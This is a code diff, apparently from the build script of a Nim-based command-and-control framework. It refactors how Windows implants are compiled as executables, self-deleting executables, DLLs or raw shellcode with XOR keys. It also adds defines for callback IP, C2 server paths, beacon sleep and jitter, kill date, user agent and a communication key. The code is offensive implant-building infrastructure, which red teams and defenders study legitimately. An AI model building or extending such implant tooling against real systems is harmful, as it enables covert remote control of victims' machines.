@@ -130,28 +130,18 @@ def compile_implant(implant_type, binary_type, xor_key, workspace_uuid=None):
             message = "Implant with debugging enabled"
             compile_function = compile_nim_debug
 
-    if binary_type == "exe":
-        print(f"Compiling .exe for {message}")
-        compile_function("exe", xor_key, config, workspace_uuid=workspace_uuid)
-    elif binary_type == "exe-selfdelete":
-        print(f"Compiling self-deleting .exe for {message}")
-        compile_function("exe-selfdelete", xor_key, config, workspace_uuid=workspace_uuid)
-    elif binary_type == "dll":
-        print(f"Compiling .dll for {message}")
-        compile_function("dll", xor_key, config, workspace_uuid=workspace_uuid)
-    elif binary_type == "raw" or binary_type == "bin":
-        print(f"Compiling .bin for {message}")
-        compile_function("raw", xor_key, config, workspace_uuid=workspace_uuid)
+    map_types = ["exe", "exe-selfdelete", "dll", "raw"]
+    aliases = {
+        "bin": "raw",
+    }
+    binary_type = aliases.get(binary_type, binary_type)
+    if binary_type  in map_types:
+        print(f"Compiling {binary_type} for {message}")
+        compile_function(binary_type, xor_key, config, workspace_uuid=workspace_uuid)
     else:
-        # Compile all
-        print(f"Compiling .exe for {message}")
-        compile_function("exe", xor_key, config, workspace_uuid=workspace_uuid)
-        print(f"Compiling self-deleting .exe for {message}")
-        compile_function("exe-selfdelete", xor_key, config, workspace_uuid=workspace_uuid)
-        print(f"Compiling .dll for {message}")
-        compile_function("dll", xor_key, config, workspace_uuid=workspace_uuid)
-        print(f"Compiling .bin for {message}")
-        compile_function("raw", xor_key, config, workspace_uuid=workspace_uuid)
+        print(f"Compiling all binaries for {message}")
+        for binary_type in map_types:
+            compile_function(binary_type, xor_key, config, workspace_uuid=workspace_uuid)
 
 
 def compile_nim_debug(binary_type, xor_key, config, workspace_uuid=None, debug=True):
@@ -171,10 +161,25 @@ def compile_nim_debug(binary_type, xor_key, config, workspace_uuid=None, debug=T
 def compile_nim(binary_type, xor_key, config, workspace_uuid=None, debug=False):
     """Compile the Nim implant."""
     # Construct compilation command
+   
     if binary_type == "exe" or binary_type == "exe-selfdelete":
+        print(f"Callback IP: {config['implant']['implantCallbackIp']}")
         compile_command = (
             "nim c -f --os:windows --cpu:amd64 -d:release -d:strip -d:noRes "
             + f"-d:INITIAL_XOR_KEY={xor_key} "
+            + f"-d:IMPLANT_CALLBACK_IP=\"{config['implant']['implantCallbackIp']}\" "
+            + f"-d:HOSTNAME=\"{config['implants_server']['hostname']}\" "
+            + f"-d:TYPE=\"{config['implants_server']['type']}\" "
+            + f"-d:PORT={config['implants_server']['port']} "
+            + f"-d:REGISTER_PATH=\"{config['implants_server']['registerPath']}\" "
+            + f"-d:TASK_PATH=\"{config['implants_server']['taskPath']}\" "
+            + f"-d:RESULT_PATH=\"{config['implants_server']['resultPath']}\" "
+            + f"-d:RECONNECT_PATH=\"{config['implants_server']['reconnectPath']}\" "
+            + f"-d:KILL_DATE=\"{config['implant']['killDate']}\" "
+            + f"-d:SLEEP_TIME=\"{config['implant']['sleepTime']}\" "
+            + f"-d:SLEEP_JITTER=\"{config['implant']['sleepJitter']}\" "
+            + f"-d:USER_AGENT=\"{config['implant']['userAgent']}\" "
+            + f"-d:HTTP_ALLOW_COMMUNICATION_KEY=\"{config['implant']['httpAllowCommunicationKey']}\" "
         )
         
         # Add workspace_uuid if provided
